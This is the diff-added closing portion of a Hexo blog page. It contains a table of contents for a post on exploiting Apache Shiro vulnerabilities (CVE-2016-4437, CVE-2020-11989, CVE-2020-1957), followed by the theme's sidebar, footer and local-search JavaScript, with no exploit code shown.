+          启动Tomcat8并访问Shiro</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%90%AD%E5%BB%BA"><span class="toc-number">1.5.</span> <span class="toc-text">
+          Linux搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8FShiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.6.</span> <span class="toc-text">
+          Linux出网环境渗透Shiro反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2016-4437"><span class="toc-number">1.6.1.</span> <span class="toc-text">
+          Apache Shiro 反序列化漏洞 (CVE-2016-4437)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">
+          漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.6.1.2.</span> <span class="toc-text">
+          影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.6.1.3.</span> <span class="toc-text">
+          漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E4%B8%8D%E5%87%BA%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8FShiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.7.</span> <span class="toc-text">
+          Linux不出网环境渗透Shiro反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E7%8E%AF%E5%A2%83"><span class="toc-number">1.7.1.</span> <span class="toc-text">
+          Windows环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0shell"><span class="toc-number">1.7.1.1.</span> <span class="toc-text">
+          拿到shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BFCS"><span class="toc-number">1.7.1.2.</span> <span class="toc-text">
+          上线CS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E7%8E%AF%E5%A2%83"><span class="toc-number">1.7.2.</span> <span class="toc-text">
+          Linux环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0shell-1"><span class="toc-number">1.7.2.1.</span> <span class="toc-text">
+          拿到shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BFvps"><span class="toc-number">1.7.2.2.</span> <span class="toc-text">
+          上线vps</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%89%93Shrio"><span class="toc-number">1.8.</span> <span class="toc-text">
+          内网环境打Shrio</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E6%AD%A6%E5%99%A8"><span class="toc-number">1.9.</span> <span class="toc-text">
+          自动化武器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">1.9.1.</span> <span class="toc-text">
+          Shiro反序列化漏洞综合利用工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8A%A0key%E5%9B%9E%E6%98%BE%E5%B7%A5%E5%85%B7"><span class="toc-number">1.9.2.</span> <span class="toc-text">
+          自动加key回显工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B7%A5%E5%85%B7-117%E4%B8%AAkey"><span class="toc-number">1.9.3.</span> <span class="toc-text">
+          命令执行工具-117个key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shiro550-720%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E2%80%93Linux%E5%A5%BD%E7%94%A8"><span class="toc-number">1.9.4.</span> <span class="toc-text">
+          Shiro550_720漏洞检测工具–Linux好用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-shrio%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-CVE-2020-11989"><span class="toc-number">1.10.</span> <span class="toc-text">
+          Apache shrio权限绕过(CVE-2020-11989)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.10.1.</span> <span class="toc-text">
+          漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="toc-number">1.10.2.</span> <span class="toc-text">
+          影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">1.10.3.</span> <span class="toc-text">
+          漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%AF%94%E8%BE%83"><span class="toc-number">1.10.4.</span> <span class="toc-text">
+          漏洞比较</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-Shiro-%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-1957"><span class="toc-number">1.11.</span> <span class="toc-text">
+          Apache Shiro 认证绕过漏洞(CVE-2020-1957)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3"><span class="toc-number">1.11.1.</span> <span class="toc-text">
+          漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-2"><span class="toc-number">1.11.2.</span> <span class="toc-text">
+          影响版本</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://gitee.com/BothSavage/PicGo/raw/master/image/头像.png" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">15</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">1</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">15</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.4.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
